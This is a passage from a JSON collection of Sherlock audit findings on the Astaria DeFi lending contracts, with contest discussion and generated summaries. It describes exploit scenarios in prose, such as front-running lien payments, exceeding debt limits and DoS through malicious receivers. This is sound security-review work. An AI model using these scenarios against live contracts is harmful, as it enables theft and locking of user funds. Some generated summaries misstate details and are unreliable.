recommend the project add requiestAuth modifier to the function \n\n```solidity\n  function transferWithdrawReserve() public {\n```\n\nWe can also change the implementation by implmenting: if the underlying withdrawProxy is address(0), revert transfer.\n\n## Discussion\n\n**IAmTurnipBoy**\n\nEscalate for 1 USDC\n\nInvalid. Impossible for withdrawReserve != 0 and there isn't a withdraw proxy, because of the following logic. Anytime there is a liquidation a liquidation accountant is deployed and that ALWAYS deploys a withdraw proxy. If there's no liquidations then there's no withdrawReserves.\n\n**sherlock-admin**\n\n > Escalate for 1 USDC\n> \n> Invalid. Impossible for withdrawReserve != 0 and there isn't a withdraw proxy, because of the following logic. Anytime there is a liquidation a liquidation accountant is deployed and that ALWAYS deploys a withdraw proxy. If there's no liquidations then there's no withdrawReserves.\n\nYou've created a valid escalation for 1 USDC!\n\nTo remove the escalation from consideration: Delete your comment.\nTo change the amount you've staked on this escalation: Edit your comment **(do not create a new comment)**.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**Evert0x**\n\nEscalation rejected. There's no hard requirement to always have a liquidation accountant..\n\n**sherlock-admin**\n\n> Escalation rejected. There's no hard requirement to always have a liquidation accountant..\n\nThis issue's escalations have been rejected!\n\nWatsons who escalated this issue will have their escalation amount deducted from their next payout.",
      "summary": "\nThis bug report is about the lack of access control in PublicVault.sol#transferWithdrawReserve which allows anyone to call it multiple times to modify the withdrawReserve value. This can be exploited by a malicious actor to keep calling the function transferWithdrawReserve() before the withdrawal proxy is created and thus decrement the withdrawReserve to 0. The code snippet for this vulnerability can be found at https://github.com/sherlock-audit/2022-10-astaria/blob/main/src/PublicVault.sol#L341-L363. The recommended solution is to add a requiestAuth modifier to the function and also implement a logic to revert the transfer if the underlying withdrawProxy is address(0). The bug report was found by Jeiwan, ctf\\_sec and was discussed by IAmTurnipBoy and Evert0x. They proposed a valid and rejected escalations respectively, which will be deducted from their next payout.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Astaria",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-10-astaria-judging/issues/163",
      "tags": [],
      "finders": [
        "Jeiwan",
        "ctf\\_sec"
      ]
    },
    {
      "id": "3663",
      "title": "H-25: Triggering liquidations ahead of expected time leads to loss and lock of funds",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2022-10-astaria-judging/issues/167 \n\n## Found by \n0xRajeev\n\n## Summary\n\nTriggering liquidations for a collateral after one of its liens has expired but before the auction window (default 2 days) at epoch end leads to loss and lock of funds.\n\n## Vulnerability Detail\n\nLiquidations are allowed to be triggered for a collateral if any of its liens have exceeded their loan duration with outstanding payments. However, the liquidation logic does not execute the decrease of lien count and setting up of liquidation accountant if the time to epoch end is greater than the auction window (default 2 days). The auction proceeds nevertheless.\n\n## Impact\n\nIf liquidations are triggered before the auction window at epoch end, they will proceed to auctions without decreasing epoch lien count, without setting up the liquidation accountant for the lien and other related logic. This will, at a minimum, lead to auction proceeds going to lien owners directly instead of via the liquidation accountants (loss of funds) and the epoch unable to proceed to the next on (lock of funds and protocol halt).\n\n## Code Snippet\n\n1.https://github.com/sherlock-audit/2022-10-astaria/blob/main/src/AstariaRouter.sol#L388-L415\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nRevisit the liquidation logic and its triggering related to the auction window and epoch end.",
      "summary": "\nThis bug report is about an issue found by 0xRajeev where triggering liquidations for a collateral after one of its liens has expired but before the auction window (default 2 days) at epoch end leads to loss and lock of funds. The liquidation logic does not execute the decrease of lien count and setting up of liquidation accountant if the time to epoch end is greater than the auction window (default 2 days). This will, at a minimum, lead to auction proceeds going to lien owners directly instead of via the liquidation accountants (loss of funds) and the epoch unable to proceed to the next on (lock of funds and protocol halt). The bug was found by manual review and the code snippet provided is from AstariaRouter.sol. The recommendation is to revisit the liquidation logic and its triggering related to the auction window and epoch end.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Astaria",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-10-astaria-judging/issues/167",
      "tags": [],
      "finders": [
        "0xRajeev"
      ]
    },
    {
      "id": "3662",
      "title": "H-24: Loans can exceed the maximum potential debt leading to vault insolvency and possible loss of LP funds",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2022-10-astaria-judging/issues/169 \n\n## Found by \n0xRajeev\n\n## Summary\n\nMissing to account for the new lien can allow loans on a collateral to exceed maximum potential debt leading to vault insolvency and potential loss of LP funds.\n\n## Vulnerability Detail\n\nThe `LienToken.createLien` function tries to prevent loans and the total potential debt from surpassing the defined `params.terms.maxPotentialDebt` limit. When the `getTotalDebtForCollateralToken` function is called, the new lien (which will be created within this transaction) is not yet added to the `liens[collateralId]` array. However, the `getTotalDebtForCollateralToken` function iterates over this very same array and will return the total debt without considering the new lien being added and for which this check is being performed.\n\n## Impact\n\nThe strategist's defined max potential debt limit can be exceeded, which changes/increases the risk for LPs, as it imposes a higher debt to the public vault. This could lead to vault insolvency and loss of LP funds.\n\nPoC: https://gist.github.com/berndartmueller/8b0f870962acc4c999822d742e89151b\n\nExample exploit: Given a public vault and a lien with a max potential debt amount of 50 ETH (that's the default `standardLien` in TestHelpers.t.sol)\n\n    1. 100 ETH have been deposited in the public vault by LPs\n    2. Bob borrows 50 ETH with his 1st NFT -> success\n    3. Bob borrows another 50 ETH with his 2nd NFT -> successful as well even though theirs a limit of 50 ETH \n    4. Bob now has 100 ETH -> The max potential debt limit is exceeded by 50 ETH\n\n## Code Snippet\n\n1. https://github.com/sherlock-audit/2022-10-astaria/blob/main/src/LienToken.sol#L253-L262\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nCheck the total debt limit after adding the new lien to the `liens[collateralId]` array.\n\n## Discussion\n\n**androolloyd**\n\nthis is working as intended, the value is intended to represent the max potential debt the collateral can potentnially be under at the moment the new terms are originated.\n\n**secureum**\n\nEscalate for 2 USDC.\n\nWe still think this is a valid issue with a high-severity impact as described above and demonstrated in the PoC.\n\ncc @berndartmueller @lucyoa \n\n**sherlock-admin**\n\n > Escalate for 2 USDC.\n> \n> We still think this is a valid issue with a high-severity impact as described above and demonstrated in the PoC.\n> \n> cc @berndartmueller @lucyoa \n\nYou've created a valid escalation for 2 USDC!\n\nTo remove the escalation from consideration: Delete your comment.\nTo change the amount you've staked on this escalation: Edit your comment **(do not create a new comment)**.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**Evert0x**\n\nEscalation accepted\n\nHaving the possibility of exceeding the maximum potential debt should be mitigated\n\n**sherlock-admin**\n\n> Escalation accepted\n> \n> Having the possibility of exceeding the maximum potential debt should be mitigated\n\nThis issue's escalations have been accepted!\n\nContestants' payouts and scores will be updated according to the changes made on this issue.",
      "summary": "\nBug report H-24 is about a vulnerability found in the `LienToken.createLien` function of the Sherlock Audit project. The function tries to prevent loans and the total potential debt from surpassing the defined `params.terms.maxPotentialDebt` limit. However, the `getTotalDebtForCollateralToken` function does not consider the new lien being added and for which this check is being performed. This can allow loans on a collateral to exceed maximum potential debt leading to vault insolvency and potential loss of LP funds. \n\nThe bug was found by 0xRajeev and a PoC has been provided by berndartmueller. The impact of this bug is that the strategist's defined max potential debt limit can be exceeded, changing/increasing the risk for LPs, as it imposes a higher debt to the public vault. This could lead to vault insolvency and loss of LP funds.\n\nThe code snippet provided is from the `LienToken.sol` file at line 253-262. The bug was discovered during a manual review. The recommendation is to check the total debt limit after adding the new lien to the `liens[collateralId]` array. The bug was discussed by androolloyd, secureum, sherlock-admin, and Evert0x, and has been accepted for 2 USDC. The contestants' payouts and scores will be updated according to the changes made on this issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Astaria",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-10-astaria-judging/issues/169",
      "tags": [],
      "finders": [
        "0xRajeev"
      ]
    },
    {
      "id": "3661",
      "title": "H-23: Payments and liquidations of multiple liens will revert and can be exploited, causing payer fund loss",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2022-10-astaria-judging/issues/172 \n\n## Found by \n0xRajeev\n\n## Summary\n\nThe `liens` array and its indexes are changed whenever a lien is fully paid back. Therefore, referencing liens by their position in the array is broken because indices change. Payments and liquidations of multiple liens within a loop will revert and can be exploited by sandwiching liens to force a payment to the attacker's lien.\n\n## Vulnerability Detail\n\nWhenever a lien position is fully paid back, the lien is deleted from the `liens` array. This means that the array is shortened and the indices of the remaining liens are changed. This is problematic when paying back liens in a loop because the indices of the remaining liens are changed which will cause revert with an index out-of-bounds error.\n\nOne can be exploited to pay for a different (attacker's) lien position because the lien array gets shortened when another payment (by the attacker or someone else) beforehand causes a deleted lien position.\n\n\n## Impact\n\nLiquidations of multiple liens and payments against a collateral token and all its liens will revert. This will result in the collateral NFT being locked forever.\n\n**Exploit scenario:** A malicious junior debt holder can buy out a senior debt (sandwich the original borrower effectively) to trigger this sequence of actions. For e.g., if the `liens` array is [1, 5, 3] where the malicious junior lien holder of 3 also buys out 1 and front-runs the borrower's intended payment for 5 by repaying 1 and forcing the array to shorten to [5, 3] will make the borrower pay off their lien of 3 instead of borrower's lien of 5. Effectively, a lien holder can \"force\" a payment to their own lien instead of another one.\n \n## Code Snippet\n1. https://github.com/sherlock-audit/2022-10-astaria/blob/main/src/LienToken.sol#L663\n2. https://github.com/sherlock-audit/2022-10-astaria/blob/main/src/LienToken.sol#L418\n3. https://github.com/sherlock-audit/2022-10-astaria/blob/main/lib/astaria-gpl/src/AuctionHouse.sol#L296\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nRevisit and fix the entire logic that manages positions with the `liens` array addition, traversal and deletion.",
      "summary": "\nThis bug report is about an issue in the smart contract code of the Astaria project. The issue, found by 0xRajeev, is that the `liens` array and its indexes are changed whenever a lien is fully paid back. This means that the array is shortened and the indices of the remaining liens are changed. As a result, payments and liquidations of multiple liens within a loop will revert and can be exploited by sandwiching liens to force a payment to the attacker's lien. If exploited, this will result in the collateral NFT being locked forever. \n\nThe code snippets provided in the report are from the LienToken.sol, and the AuctionHouse.sol files. The tool used to find the issue was manual review. \n\nThe recommendation given is to revisit and fix the entire logic that manages positions with the `liens` array addition, traversal and deletion.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Astaria",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-10-astaria-judging/issues/172",
      "tags": [
        "Back-Running",
        "Front-Running"
      ],
      "finders": [
        "0xRajeev"
      ]
    },
    {
      "id": "3660",
      "title": "H-22: Public vault depositors will receive fewer vault shares until the first payment",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2022-10-astaria-judging/issues/173 \n\n## Found by \n0xRajeev\n\n## Summary\n\nPublic vault total asset calculation is incorrect until the first payment, leading to depositors receiving fewer vault shares than expected.\n\n## Vulnerability Detail\n\nAs long as `PublicVault.last` is set to 0, the `PublicVault.totalAssets` function returns the actual ERC-20 token balance (WETH) of the public vault. Due to borrowing, this balance is reduced by the borrowed amount. Therefore, as there is no payment, this leads to depositors receiving fewer vault shares than expected.\n\n## Impact\n\nPoC: https://gist.github.com/berndartmueller/8a71ff76c7eb8207e1f01a154a873b2c\n\nPublic vault depositors will receive fewer vault shares until the first payment.\n \n## Code Snippet\n\n1. https://github.com/sherlock-audit/2022-10-astaria/blob/main/src/PublicVault.sol#L407\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nRevisit the logic behind updating `last` when `yIntercept` and/or `slope` are updated.",
      "summary": "\nThis bug report is about the incorrect calculation of the total asset of a public vault, leading to depositors receiving fewer vault shares than expected. This issue was found by 0xRajeev and the impact of this vulnerability is that public vault depositors will receive fewer vault shares until the first payment. This vulnerability was identified through manual review, and the code snippet responsible for this issue can be found at https://github.com/sherlock-audit/2022-10-astaria/blob/main/src/PublicVault.sol#L407. The recommendation to fix this issue is to revisit the logic behind updating the \"last\" value when \"yIntercept\" and/or \"slope\" are updated.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Astaria",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-10-astaria-judging/issues/173",
      "tags": [],
      "finders": [
        "0xRajeev"
      ]
    },
    {
      "id": "3659",
      "title": "H-21: Epochs can be progressed during ongoing auctions to cause LP fund loss and collateral lockup",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2022-10-astaria-judging/issues/175 \n\n## Found by \n0xRajeev\n\n## Summary\n\nThe `currentEpoch` can be progressed while having an ongoing auction which will completely mess up the liquidation logic to potentially cause LP fund loss and collateral lockup.\n\n## Vulnerability Detail\n\nThe `LiquidationAccountant.claim()` function is only callable if `finalAuctionEnd` is set to 0 or the  `block.timestamp` is greater than `finalAuctionEnd` (i.e. auction has ended). Furthermore, `PublicVault.processEpoch` should only be callable if there is *no* ongoing auction if a liquidation accountant is deployed in the current epoch.\n\n`finalAuctionEnd` is set within the `LiquidationAccountant.handleNewLiquidation` function, which is called from the `AstariaRouter.liquidate` function. However, instead of providing a timestamp of the auction end, a value of `2 days + 1 days` is given because `COLLATERAL_TOKEN.auctionWindow()` returns `2 days`.\n\nThis does not achieve the intended constraint on checking for the end of the auction because it uses a fixed duration instead of a timestamp.\n\n## Impact\n\nEpochs can be progressed during ongoing auctions to completely mess up the liquidation logic to potentially cause LP fund loss and collateral lockup.\n \n## Code Snippet\n\n1. https://github.com/sherlock-audit/2022-10-astaria/blob/main/src/LiquidationAccountant.sol#L67\n2. https://github.com/sherlock-audit/2022-10-astaria/blob/main/src/PublicVault.sol#L244-L248\n3. https://github.com/sherlock-audit/2022-10-astaria/blob/main/src/AstariaRouter.sol#L409\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nRevisit the logic to use an appropriate timestamp instead of a fixed duration.",
      "summary": "\nThis bug report is about the `currentEpoch` being progressed while having an ongoing auction which can mess up the liquidation logic to potentially cause LP fund loss and collateral lockup. The issue is related to the `LiquidationAccountant.claim()` function which is only callable if `finalAuctionEnd` is set to 0 or the  `block.timestamp` is greater than `finalAuctionEnd` (i.e. auction has ended). The `finalAuctionEnd` is set within the `LiquidationAccountant.handleNewLiquidation` function, which is called from the `AstariaRouter.liquidate` function. However, instead of providing a timestamp of the auction end, a value of `2 days + 1 days` is given. This does not achieve the intended constraint on checking for the end of the auction because it uses a fixed duration instead of a timestamp. \n\nThe impact of this bug is that epochs can be progressed during ongoing auctions to completely mess up the liquidation logic to potentially cause LP fund loss and collateral lockup. The code snippet related to this bug can be found in the following files: \n\n1. https://github.com/sherlock-audit/2022-10-astaria/blob/main/src/LiquidationAccountant.sol#L67\n2. https://github.com/sherlock-audit/2022-10-astaria/blob/main/src/PublicVault.sol#L244-L248\n3. https://github.com/sherlock-audit/2022-10-astaria/blob/main/src/AstariaRouter.sol#L409\n\nThe bug was found manually by 0xRajeev. The recommendation to fix this bug is to revisit the logic to use an appropriate timestamp instead of a fixed duration.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Astaria",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-10-astaria-judging/issues/175",
      "tags": [],
      "finders": [
        "0xRajeev"
      ]
    },
    {
      "id": "3658",
      "title": "H-20: Anyone can deposit and mint withdrawal proxy shares to capture distributed yield from borrower interests",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2022-10-astaria-judging/issues/176 \n\n## Found by \nTurnipBoy, 0x4141, 0xRajeev, bin2chen\n\n## Summary\n\nAnyone can deposit and mint Withdrawal proxy shares by directly interacting with the base `ERC4626Cloned` contract's functions, allowing them to capture distributed yield from borrower interests.\n\n## Vulnerability Detail\n\nThe `WithdrawProxy` contract extends the `ERC4626Cloned` vault contract implementation. The `ERC4626Cloned` contract has the functionality to deposit and mint vault shares. Usually, withdrawal proxy shares are only distributed via the `WithdrawProxy.mint` function, which is only called by the `PublicVault.redeemFutureEpoch `function. Anyone can deposit WETH into a deployed Withdraw proxy to receive shares, wait until assets (WETH) are deposited via the `PublicVault.transferWithdrawReserve` or `LiquidationAccountant.claim` function and then redeem their shares for WETH assets. \n\n## Impact\n\nBy depositing/minting directly to the Withdraw proxy, one can get interest yield on-demand without being an LP and having capital locked for epoch(s). This may potentially be timed in a way to deposit/mint only when we know that interest yields are being paid by a borrower who is not defaulting on their loan. The returns are diluted for the LPs at the expense of someone who directly interacts with the underlying proxy.\n \n## Code Snippet\n\n1. https://github.com/sherlock-audit/2022-10-astaria/blob/main/lib/astaria-gpl/src/ERC4626-Cloned.sol#L305-L339\n2. https://github.com/sherlock-audit/2022-10-astaria/blob/main/src/PublicVault.sol#L198\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nOverwrite the `ERC4626Cloned.afterDeposit` function and revert to prevent public deposits and mints.\n\n## Discussion\n\n**IAmTurnipBoy**\n\nEscalate for 1 USDC\n\nThis leads to material loss of funds. Definitely high risk\n\n**sherlock-admin**\n\n > Escalate for 1 USDC\n> \n> This leads to material loss of funds. Definitely high risk\n\nYou've created a valid escalation for 1 USDC!\n\nTo remove the escalation from consideration: Delete your comment.\nTo change the amount you've staked on this escalation: Edit your comment **(do not create a new comment)**.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**Evert0x**\n\nEscalation accepted\n\n**sherlock-admin**\n\n> Escalation accepted\n\nThis issue's escalations have been accepted!\n\nContestants' payouts and scores will be updated according to the changes made on this issue.",
      "summary": "\nThis bug report is regarding the Astaria-GPL protocol, which allows users to deposit and mint Withdrawal proxy shares to capture distributed yield from borrower interests. The vulnerability was found by TurnipBoy, 0x4141, 0xRajeev, and bin2chen, and it was discovered that anyone can deposit and mint Withdrawal proxy shares by directly interacting with the base ERC4626Cloned contract's functions. This allows them to capture distributed yield from borrower interests without being an LP and having capital locked for epochs, which can lead to a material loss of funds.\n\nTo fix this issue, it is recommended to overwrite the ERC4626Cloned.afterDeposit function and revert to prevent public deposits and mints. This was accepted by Evert0x, and contestants' payouts and scores will be updated according to the changes made on this issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Astaria",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-10-astaria-judging/issues/176",
      "tags": [],
      "finders": [
        "0xRajeev",
        "TurnipBoy",
        "bin2chen",
        "0x4141"
      ]
    },
    {
      "id": "3657",
      "title": "H-19: Auction bid that partially pays back an expired lien will revert",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2022-10-astaria-judging/issues/179 \n\n## Found by \n0xRajeev, Prefix, sorrynotsorry\n\n## Summary\n\nAuction bids will revert for a bid amount that does not fully pay back an expired lien.\n\n## Vulnerability Detail\n\nThe value of `lien.last` is updated to `block.timestamp` in several parts of the code, even for expired liens. Payments made as part of liquidations will set `lien.last` to `block.timestamp` > `lien.start + lien.duration` causing a revert in the flow shown below at step 3 when it is subtracted from `end`:\n\n1. `IPublicVault(lienOwner).afterPayment(lienId);`\n2. `slope += LIEN_TOKEN().calculateSlope(lienId);`\n3. `return (owedAtEnd - lien.amount).mulDivDown(1, end - lien.last);`\n\n## Impact\n\nAuction bids will revert for a bid amount that does not fully pay back an expired lien. If a lien is only partially paid back, it will reach the `if` branch in `LienToken._payment`, which sets `lien.last` to the current timestamp (which itself is `> lien.start + lien.duration`, hence the liquidation) and then revert.\n\nThis affects the economic efficiency of auctions because it DoS's partial bids and therefore results in loss of funds to LPs.\n\n## Code Snippet\n\n1. https://github.com/sherlock-audit/2022-10-astaria/blob/main/src/LienToken.sol#L444\n2. https://github.com/sherlock-audit/2022-10-astaria/blob/main/src/LienToken.sol#L625 \n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nRevisit the logic that updates `lien.last` in the protocol to ensure no reverts in expected flows.",
      "summary": "\nThis bug report is about an issue with auction bids that partially pay back an expired lien. The issue is that the bid will revert and this affects the economic efficiency of auctions because it DoS's partial bids and results in loss of funds to LPs. The bug was found by 0xRajeev, Prefix, sorrynotsorry and was detected through manual review. \n\nThe code snippet of the bug is located in 2 files in the GitHub repository: LienToken.sol#L444 and LienToken.sol#L625. The issue is caused by the value of `lien.last` being updated to `block.timestamp` in several parts of the code, even for expired liens. Payments made as part of liquidations will set `lien.last` to `block.timestamp` > `lien.start + lien.duration` causing a revert in the flow.\n\nThe recommendation to fix this issue is to revisit the logic that updates `lien.last` in the protocol to ensure no reverts in expected flows.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Astaria",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-10-astaria-judging/issues/179",
      "tags": [],
      "finders": [
        "0xRajeev",
        "sorrynotsorry",
        "Prefix"
      ]
    },
    {
      "id": "3656",
      "title": "H-18: Lien buyout with new terms does not update the slope of public vaults",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2022-10-astaria-judging/issues/180 \n\n## Found by \n0xRajeev\n\n## Summary\n\nLien buyout with new terms does not update the slope of public vaults leading to reverts and potential insolvency of vaults.\n\n## Vulnerability Detail\n\nIn the `VaultImplementation.buyoutLien` function, a lien is bought out with new terms. Terms of a lien (last, start, rate, duration) will have changed after a buyout. This changes the slope calculation, however, after the buyout, the slope for the public vault is not updated.\n\n## Impact\n\nThere are multiple parts of the code affected by this.\n\n1) When liquidating, the vault slope is adjusted by the liens slope (see https://github.com/sherlock-audit/2022-10-astaria/blob/main/src/AstariaRouter.sol#L385-L387). In case of a single lien, the PublicVault.updateVaultAfterLiquidation function can revert if the lien terms have changed previously due to a buyout (https://github.com/sherlock-audit/2022-10-astaria/blob/main/src/PublicVault.sol#L532). Hence, liquidations with a public vault involved, will revert.\n\n2) The PublicVault contract calculates the implied value of a vault (ie. totalAssets) with the use of the slope value (see https://github.com/sherlock-audit/2022-10-astaria/blob/main/src/PublicVault.sol#L412). As the slope value can be outdated, this leads to undervalue or overvalue of a public vault and thus vault share calculations will be incorrect.\n\n## Code Snippet\n\n1. https://github.com/sherlock-audit/2022-10-astaria/blob/main/src/VaultImplementation.sol#L280-L304\n2. https://github.com/sherlock-audit/2022-10-astaria/blob/main/src/LienToken.sol#L150-L153\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nCalculate the slope of the lien before the buyout in the `VautImplementation.buyoutLien` function, subtract the calculated slope value from `PublicVault.slope`, update lien terms, recalculate the slope and add the new updated slope value to `PublicVault.slope`.",
      "summary": "\nThis bug report is about an issue in the code of the AstariaRouter and PublicVault contracts, which are part of the Sherlock Audit 2022-10-astaria-judging project. The issue, found by 0xRajeev, is that when a lien is bought out with new terms, the slope for the public vault is not updated. This can lead to liquidations with a public vault involved reverting, and the implied value of a public vault being incorrect. The code snippet for the issue is from the VaultImplementation.sol and LienToken.sol contracts, and the tool used for finding the issue was manual review. The recommendation is to calculate the slope of the lien before the buyout, subtract the calculated slope value from the PublicVault.slope, update the lien terms, recalculate the slope and add the new updated slope value to the PublicVault.slope.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Astaria",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-10-astaria-judging/issues/180",
      "tags": [],
      "finders": [
        "0xRajeev"
      ]
    },
    {
      "id": "3655",
      "title": "H-17: A malicious lien buyer can DoS to cause fund loss/lock",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2022-10-astaria-judging/issues/181 \n\n## Found by \n0xRajeev\n\n## Summary\n\nA malicious lien buyer can DoS to cause fund loss/lock of other lien holders & borrower collateral.\n\n## Vulnerability Detail\n\nAnyone can call `buyoutLien` to purchase a lien token delivered to an arbitrary receiver. A malicious entity (even the borrower themselves) can purchase a small lien amount with its token delivered to their contract, which can implement `supportsInterface()` with arbitrary code, e.g. revert, that gets executed by the protocol in multiple places giving the attacker control at those points.\n\n## Impact\n\n1. An attacker can revert `endAuction()` to prevent the release of collateral to the winner.\n2. An attacker can revert `liquidate()` to prevent the liquidation from even starting.\n3. An attacker can revert `_payment()` to prevent any lien payments from succeeding in calls to `makePayment(uint256 collateralId, uint256 paymentAmount)`\n\nThus, a malicious lien buyer can DoS to cause fund loss/lock of other lien holders & loss/lock of borrower collateral.\n\n## Code Snippet\n\n1. https://github.com/sherlock-audit/2022-10-astaria/blob/main/lib/astaria-gpl/src/AuctionHouse.sol#L195\n2. https://github.com/sherlock-audit/2022-10-astaria/blob/main/src/AstariaRouter.sol#L381\n3. https://github.com/sherlock-audit/2022-10-astaria/blob/main/src/LienToken.sol#L613\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\n1. Maintain a mapping of active public vaults.\n2. Account for malicious lien token owners via lien buyouts.\n3. Use reentrancy guards.",
      "summary": "\nThis bug report is about a vulnerability found in the Astaria protocol which allows malicious lien buyers to cause fund loss/lock of other lien holders and borrower collateral. This vulnerability occurs when a malicious entity calls the `buyoutLien` function, which allows them to purchase a lien token delivered to an arbitrary receiver. The malicious entity can then use this token to execute arbitrary code, such as reverting the `endAuction()`, `liquidate()` and `_payment()` functions, which can cause fund loss/lock of other lien holders and borrower collateral.\n\nThe bug was found using manual review, and the code snippets related to the vulnerability are provided in the report. The recommendation to mitigate this issue is to maintain a mapping of active public vaults, account for malicious lien token owners via lien buyouts and use reentrancy guards.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Astaria",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-10-astaria-judging/issues/181",
      "tags": [],
      "finders": [
        "0xRajeev"
      ]
    },
    {
      "id": "3654",
      "title": "H-16: `VaultImplementation._validateCommitment` may prevent liens that satisfy their terms of `maxPotentialDebt`",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2022-10-astaria-judging/issues/182 \n\n## Found by \nobront, 0xRajeev, hansfriese, rvierdiiev, zzykxx, Jeiwan, tives\n\n## Summary\n\nThe calculation of `potentialDebt` in `VaultImplementation._validateCommitment()` is incorrect and will cause a DoS to legitimate borrowers.\n\n## Vulnerability Detail\n\nThe calculation of potentialDebt in `VaultImplementation._validateCommitment()` is incorrect because it computes `uint256 potentialDebt = seniorDebt * (ld.rate + 1) * ld.duration;` which incorrectly adds a factor of `ld.duration` to `seniorDebt` thus making the potential debt much higher by that factor than it will be. The use of `INTEREST_DENOMINATOR` and implied lien rate is also missing here. \n\n\n## Impact\n\nLiens that would have otherwise satisfied the constraint of `potentialDebt <= ld.maxPotentialDebt` will fail because of this miscalculation and will cause a DoS to legitimate borrowers and likely all of them.\n\n## Code Snippet\n\n1. https://github.com/sherlock-audit/2022-10-astaria/blob/main/src/VaultImplementation.sol#L221-L225\n2. https://github.com/sherlock-audit/2022-10-astaria/blob/main/src/LienToken.sol#L256-L262\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nChange the calculation to `uint256 potentialDebt = seniorDebt * (ld.rate * ld.duration + 1).mulDivDown(1, INTEREST_DENOMINATOR);`. This should also consider the implied rate of all the liens against the collateral instead of only this lien.\n\n## Discussion\n\n**secureum**\n\nEscalate for 2 USDC.\n\nGiven the potential impact to different flows/contexts, we still think this is a high-severity impact (not Medium as judged). A majority of the dups (4 of 6) also reported this as a High.\n\ncc @berndartmueller @lucyoa\n\n**sherlock-admin**\n\n > Escalate for 2 USDC.\n> \n> Given the potential impact to different flows/contexts, we still think this is a high-severity impact (not Medium as judged). A majority of the dups (4 of 6) also reported this as a High.\n> \n> cc @berndartmueller @lucyoa\n\nYou've created a valid escalation for 2 USDC!\n\nTo remove the escalation from consideration: Delete your comment.\nTo change the amount you've staked on this escalation: Edit your comment **(do not create a new comment)**.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**Evert0x**\n\nEscalation accepted.\n\n\n**sherlock-admin**\n\n> Escalation accepted.\n> \n\nThis issue's escalations have been accepted!\n\nContestants' payouts and scores will be updated according to the changes made on this issue.",
      "summary": "\nIssue H-16 is a bug report found by obront, 0xRajeev, hansfriese, rvierdiiev, zzykxx, Jeiwan, and tives on the GitHub repository of sherlock-audit/2022-10-astaria-judging/issues/182. The issue is related to the calculation of `potentialDebt` in `VaultImplementation._validateCommitment()`, which incorrectly adds a factor of `ld.duration` to `seniorDebt` thus making the potential debt much higher than it should be. This miscalculation will cause a DoS to legitimate borrowers as liens that would have otherwise satisfied the constraint of `potentialDebt <= ld.maxPotentialDebt` will fail. The code snippet of the issue can be found at https://github.com/sherlock-audit/2022-10-astaria/blob/main/src/VaultImplementation.sol#L221-L225 and https://github.com/sherlock-audit/2022-10-astaria/blob/main/src/LienToken.sol#L256-L262. The recommended solution is to change the calculation to `uint256 potentialDebt = seniorDebt * (ld.rate * ld.duration + 1).mulDivDown(1, INTEREST_DENOMINATOR);` and to consider the implied rate of all the liens against the collateral instead of only this lien. The issue was escalated for 2 USDC, accepted, and the contestants' payouts and scores will be updated according to the changes made on this issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Astaria",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-10-astaria-judging/issues/182",
      "tags": [],
      "finders": [
        "Jeiwan",
        "0xRajeev",
        "hansfriese",
        "tives",
        "rvierdiiev",
        "obront",
        "zzykxx"
      ]
    },
    {
      "id": "3653",
